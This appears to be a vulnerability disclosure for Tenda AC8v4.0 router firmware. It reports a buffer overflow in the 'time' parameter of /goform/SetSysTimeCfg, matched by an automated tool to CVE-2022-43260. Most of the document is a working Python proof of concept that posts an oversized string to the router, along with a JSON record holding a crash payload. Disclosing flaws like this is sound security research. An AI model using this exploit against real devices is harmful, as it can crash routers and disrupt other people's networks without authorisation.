## Overview

- Firmware download website: [AC8v4.0 Firmware_Download Center_Tenda Taiwan,China](https://www.tendacn.com/tw/download/detail-4636.html)

## Affected version

AC8v4.0 Firmware V16.03.33.05

## Vulnerability Details

Using our automated recurring vulnerability detection framework IoTBec, we found that an **overflow** vulnerability matched with **CVE-2022-43260** in Tenda AC8v4.0 Firmware V16.03.33.05. The issue resides in the **`/goform/SetSysTimeCfg`** interface, where the user-supplied **`time`** parameter can be exploited to trigger the overflow condition.

```json
  {
    "vendor": "Tenda",
    "product": "AC8",
    "URI": "/goform/SetSysTimeCfg",
    "form_parameter": "", // data packets have been encrypted
    "form_format": "",
    "content": "",
    "button": "Save",
    "navigation": "System Settings->Time Settings",
    "match_result": [
      {
        "CVE ID": "CVE-2022-43260",
        "vendor": "Tenda",
        "product": "AC18",
        "URI": "/goform/SetSysTimeCfg",
        "form_parameter": "['timePeriod', 'ntpServer', 'timeZone']",
        "form_format": "key-value",
        "button": "Save",
        "navigation": "System Settings->Time Settings",
        "vul_type": "Overflow",
        "function name": "fromSetSysTime",
        "parameter or argument": "time",
        "POC": ""
      }
    ],
    "payloads": [
      //"time=A*1000&timeType=manual", // CRASH ⚠
      // 2
      // 3
      // 4
      // 5
      // 6
      // 7
    ]
  },
```

## Proof of Concept

```python
import requests

ip = "192.168.153.2"
def calculate_length(data):
    count = 0
    for x, y in data.items():
        count += len(x) + len(y) + 2
    return count - 1

url = "http://" + ip + "/goform/SetSysTimeCfg"
data = {
    "time": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "timeType": "manual"
}
headers = {
    'Host': ip,
    'Content-Length': f'{calculate_length(data)}',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'password=1234',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
    'Accept':
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'close'
}
try:
    res = requests.post(url=url, headers=headers, data=data, timeout=500, verify=False)
    print(res.status_code)
except requests.exceptions.Timeout:
    print("TIMEOUT")
except Exception as e:
    print("EXCEPTION:", str(e))
```


![image-20250809162514271](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250809162514271.png)
